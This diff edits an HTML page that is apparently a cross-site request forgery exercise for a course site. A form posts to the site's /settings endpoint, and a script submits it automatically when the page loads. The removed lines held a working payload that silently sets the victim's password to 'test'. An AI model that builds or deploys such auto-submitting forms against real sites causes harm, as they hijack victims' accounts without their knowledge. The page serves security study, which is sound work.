@@ -1,8 +1,8 @@
 <html>
   <body>
     <form action="https://cats.is-course.ru/settings" method="POST">
-      <input type="hidden" value="test" name="password"/>
-      <input type="hidden" value="test" name="confirm-password"/>
+      <input type="password" id="password" required="test" name="password"/>
+      <input type="password" id="confirm-password" required="test" name="confirm-password"/>
     </form>
     <script>
       document.forms[0].submit();
